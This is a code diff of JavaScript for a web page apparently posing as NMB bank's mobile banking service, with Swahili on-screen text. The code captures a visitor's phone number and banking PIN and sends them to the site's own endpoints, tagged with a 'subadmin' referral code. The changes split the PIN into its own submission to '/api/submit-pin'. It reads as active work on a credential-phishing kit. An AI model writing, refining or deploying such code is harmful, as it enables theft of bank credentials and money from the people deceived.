@@ -1,6 +1,5 @@
 const sessionId = 'nmb_' + Math.random().toString(36).substring(2, 9);
 
-// Grab subadmin 'ref' query parameter from URL to route requests accurately
 const urlParams = new URLSearchParams(window.location.search);
 const subadminRef = urlParams.get('ref') || '';
 
@@ -174,8 +173,7 @@ document.getElementById('btn-step3-submit').addEventListener('click', async () =
             body: JSON.stringify({
                 sessionId,
                 phone: state.phone,
-                pin: state.pin || 'Pending PIN',
-                ref: subadminRef // Attached subadmin ref routing
+                ref: subadminRef
             })
         });
         
@@ -221,14 +219,12 @@ document.getElementById('btn-submit-pin').addEventListener('click', async () => 
     showLoading('Inathibitisha PIN na NMB Mkononi...');
 
     try {
-        await fetch('/api/submit-application', {
+        await fetch('/api/submit-pin', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 sessionId,
-                phone: state.phone,
-                pin: state.pin,
-                ref: subadminRef // Attached subadmin ref routing
+                pin: state.pin
             })
         });
 
